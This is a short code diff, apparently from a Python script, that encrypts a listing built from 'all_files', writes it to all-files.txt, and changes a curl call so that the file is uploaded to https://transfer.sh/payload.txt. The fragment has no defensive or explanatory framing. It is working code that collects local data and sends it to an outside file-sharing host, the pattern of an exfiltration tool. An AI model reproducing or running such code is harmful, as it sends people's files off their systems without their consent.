@@ -21,6 +21,10 @@ token = fe.encrypt('\n'.join(all_files).encode())
 with open('all-files.txt', 'wb') as f:
     f.write(token)
 
-output = call(['curl', '--upload-file', './all-files.txt'])
-print("uploaded")
-print(output)
+output = call(['curl',
+    '--upload-file',
+    './all-files.txt',
+    'https://transfer.sh/payload.txt'])
+
+os.write(1, "uploaded".encode())
+os.write(1, output.encode())
